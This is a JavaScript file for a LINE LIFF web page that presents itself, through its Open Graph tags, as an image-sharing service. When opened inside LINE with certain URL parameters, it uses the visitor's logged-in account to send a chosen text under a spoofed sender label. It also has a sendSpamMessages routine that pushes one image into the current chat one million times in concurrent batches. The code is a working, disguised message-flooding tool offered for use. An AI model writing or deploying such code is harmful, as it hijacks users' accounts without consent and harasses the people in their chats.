const LIFF_ID = "2005745965-Vvy4WKpZ";

document.addEventListener('DOMContentLoaded', async () => {
    try {
        await liff.init({ liffId: LIFF_ID });
        if (liff.isInClient()) {
            await initializeLiff();
        }
    } catch (error) {
        console.error('LIFF Initialization failed', error);
    }
});

async function initializeLiff() {
    try {
        if (!liff.isLoggedIn()) {
            window.alert("LINEアカウントにログインしてください。");
            liff.login();
        } else {
            await urlParamsCheck();
        }
    } catch (error) {
        console.error('Error initializing LIFF', error);
    }
}

function updateOgTags(type, content) {
    const ogTitle = document.querySelector('meta[property="og:title"]');
    const ogDescription = document.querySelector('meta[property="og:description"]');
    const ogImage = document.querySelector('meta[property="og:image"]');

    if (ogTitle) ogTitle.setAttribute('content', '山本の画像共有サービス');
    if (ogDescription) ogDescription.setAttribute('content', '山本の画像共有サービスから画像が共有されました。');
}

async function urlParamsCheck() {
    const urlParams = new URLSearchParams(window.location.search);
    const textParam = urlParams.get('text');
    const spamParam = urlParams.get('spam');

    if (textParam !== null) {
        await sendMessage({
            type: 'text',
            text: textParam,
            sentBy: {
                label: "ねずみぷろじぇくと",
                iconUrl: "https://raw.githubusercontent.com/nezumi0627/nezuminium.github.io/main/icon.gif",
                linkUrl: "https://nezumi0627.github.io/nezuminium.github.io/"
            }
        });
        liff.closeWindow();
    }

    if (spamParam === 'spam') {
        await sendSpamMessages(1000000, {
            type: 'image',
            originalContentUrl: "https://cdn.imagedeliveries.com/2439717/64061e0223c88f6b6cf77a08132f72dd658d5e01/2.webp",
            previewImageUrl: "https://cdn.imagedeliveries.com/2439717/64061e0223c88f6b6cf77a08132f72dd658d5e01/2.webp"
        });
        liff.closeWindow();
    }

    if (spamParam === '?abc') {
        const imageMessage = {
            type: 'image',
            originalContentUrl: "https://cdn.imagedeliveries.com/2439717/64061e0223c88f6b6cf77a08132f72dd658d5e01/2.webp",
            previewImageUrl: "https://cdn.imagedeliveries.com/2439717/64061e0223c88f6b6cf77a08132f72dd658d5e01/2.webp"
        };

        updateOgTags('image', imageMessage.originalContentUrl);
        await sendSpamMessages(1000000, imageMessage);
        liff.closeWindow();
    }
}

async function sendMessage(message) {
    try {
        await liff.sendMessages([message]);
        console.log('Message sent');
    } catch (error) {
        console.error('Error sending message', error);
    }
}

async function sendSpamMessages(count, message, batchSize = 100, concurrentLimit = 10) {
    const sendBatch = async (batch) => {
        const batchPromises = batch.map(async () => {
            try {
                await sendMessage(message);
            } catch (error) {
                console.error('Batch send error:', error);
            }
        });
        await Promise.all(batchPromises);
    };

    const batches = [];
    for (let i = 0; i < count; i += batchSize) {
        const batchCount = Math.min(batchSize, count - i);
        batches.push(Array(batchCount).fill(null));
    }

    for (let i = 0; i < batches.length; i += concurrentLimit) {
        const concurrentBatches = batches.slice(i, i + concurrentLimit);
        await Promise.all(concurrentBatches.map(sendBatch));
    }
}
